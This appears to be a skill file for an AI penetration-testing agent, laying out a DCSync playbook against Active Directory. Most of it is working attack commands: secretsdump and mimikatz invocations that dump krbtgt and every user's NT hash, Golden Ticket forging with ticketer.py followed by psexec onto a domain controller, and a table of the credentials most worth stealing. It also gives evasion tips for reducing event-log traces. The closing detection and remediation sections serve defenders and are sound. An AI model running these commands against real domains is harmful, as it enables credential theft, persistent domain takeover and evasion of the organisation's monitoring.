---
name: dcsync
description: Abuse replication rights (DS-Replication-Get-Changes + GetChangesAll) to dump krbtgt and arbitrary user NT hashes from a DC.
metadata:
  subdomain: active-directory
  when_to_use: "dcsync replication rights secretsdump krbtgt nt hash dump"
  mitre_attack:
    - T1003.006
---

# DCSync Playbook

DCSync is not a vulnerability — it's a legitimate AD feature for
domain controllers to replicate. The "vulnerability" is when a
non-DC principal has the replication-rights ACL.

## 1. Identify DCSync candidates
In a hosted engagement, inspect the authorized collection with
`bloodhound_mcp_exposure_finder` and `bloodhound_mcp_object_profile`, or use
bounded read-only `bloodhound_mcp_cypher_query` for a specific principal.
Check data quality before treating absent edges as proof of no exposure.
Standalone OSS may use its registered `bhce_cypher` tool instead.

Or Cypher direct:
```
MATCH (n)-[:GetChanges|GetChangesAll]->(:Domain)
RETURN DISTINCT n.name, labels(n)
```

Common holders (legitimate):
- Domain Admins, Enterprise Admins, Domain Controllers
- Exchange Trusted Subsystem (Exchange installs grant by default — historical PrivExchange)
- Replicator (rare)

Common holders (misconfig = jackpot):
- Service accounts (admins delegated mistakenly)
- Helpdesk groups
- Groups from old migrations

## 2. Execute DCSync
**Impacket** (most reliable):
```bash
# All NT hashes including krbtgt
secretsdump.py 'DOM/USER:PASS@DC_IP' -just-dc \
  -outputfile /tmp/secrets

# Just one target user
secretsdump.py 'DOM/USER:PASS@DC_IP' -just-dc-user 'krbtgt'

# With NT hash auth instead of password
secretsdump.py -hashes :NT_HASH 'DOM/USER@DC_IP' -just-dc

# With Kerberos ticket (cleaner OPSEC)
export KRB5CCNAME=/tmp/user.ccache
secretsdump.py -k -no-pass 'DOM/USER@DC_FQDN' -just-dc
```

**Mimikatz** (from Windows):
```
lsadump::dcsync /domain:dom.local /user:krbtgt
lsadump::dcsync /domain:dom.local /all /csv
```

## 3. Output files
secretsdump produces:
- `/tmp/secrets.ntds` — `user:RID:LM_HASH:NT_HASH:::` format
- `/tmp/secrets.ntds.kerberos` — Kerberos keys (aes256, aes128, des)
- `/tmp/secrets.ntds.cleartext` — any reversibly-encrypted passwords (rare, but yes)

## 4. Highest-value secrets to grab
| User | Why | What unlocks |
|---|---|---|
| `krbtgt` | Master Kerberos key | Golden Ticket — persistence + arbitrary user impersonation forever (until rotation) |
| `Administrator` | Built-in domain admin | Direct admin on most assets |
| Domain Admin members | Lateral movement | Most assets |
| `<trustname>$` | Trust accounts | Cross-forest movement |
| Service accounts | Often local admin on hosts | Lateral movement |
| Exchange computer accounts | Mailbox access | E-discovery / pivot |

## 5. Golden Ticket (post-DCSync)
With krbtgt NT hash:
```bash
ticketer.py -nthash KRBTGT_NT \
  -domain-sid 'S-1-5-21-XXXX-YYYY-ZZZZ' \
  -domain 'dom.local' \
  Administrator
# Produces Administrator.ccache — TGT for Administrator that lasts 10 years

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass 'DC@DC_FQDN'
```

## 6. Promote
```
kg_add_node(kind="credential", label="krbtgt:NT_HASH",
            props={"source":"dcsync","value":"<hash>"})
kg_add_node(kind="vulnerability", label="DCSync from <principal>",
            props={"severity":"critical"})
kg_add_edge(src=<vuln>, dst=<krbtgt>, kind="extracts")
kg_add_edge(src=<krbtgt>, dst=<crown_jewel:domain>, kind="compromises")
```

## OPSEC
- DCSync generates **event 4662** on DCs with `Properties: Replicating Directory Changes`
- Defender's high-signal detection (the **only** good DCSync detection)
- BloodHound's `:DS-Replication-Get-Changes` GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
- A single DCSync run, scoped to one user (`-just-dc-user`), produces less log volume than `-just-dc`
- Use Kerberos auth (`-k`) instead of NTLM to avoid 4624 type-3 noise

## Detection signature (so you know what blue sees)
```
EventCode=4662
ObjectType=domainDNS
Properties: %{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} OR %{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
SubjectUserName != *$  (filter out DC computer accounts)
```

## CVSS
- DCSync available to non-DC principal: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 9.0
- Already DA + DCSync: not a separate finding, just post-compromise activity

## Defender remediation
```powershell
# Audit current holders of replication rights
Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties nTSecurityDescriptor |
  Select -ExpandProperty nTSecurityDescriptor |
  Select -ExpandProperty Access |
  Where { $_.ObjectType -in @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') } |
  Format-Table IdentityReference, ActiveDirectoryRights

# Remove unauthorized holders via dsacls
dsacls "DC=dom,DC=local" /R "DOM\BadPrincipal"
```
